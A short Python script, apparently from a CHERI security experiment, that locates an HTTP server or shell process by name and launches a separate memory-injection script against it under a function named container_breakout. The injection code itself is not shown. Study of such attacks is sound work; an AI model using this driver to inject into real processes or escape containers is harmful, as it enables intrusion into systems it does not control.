import subprocess
import os
from sys import argv


def find_process_by_name(cheri_on):
    targets = []

    if cheri_on == "cheri_on":
        targets = ["simple_http_server_cheri"]
    else:
        targets = ["http.server", "fish"]
    for target in targets:
        target_pid = int(subprocess.check_output(["pgrep","-f", target]))
        if target_pid:
            return target_pid


def container_breakout(cheri_on):
    target_pid = find_process_by_name(cheri_on)
    if target_pid:
        os.chdir(os.getcwd()+"/mem_inject")
        subprocess.run("python3 mem_inject.py " + str(target_pid) + " " + argv[1], shell=True, check=True)


container_breakout(argv[1])
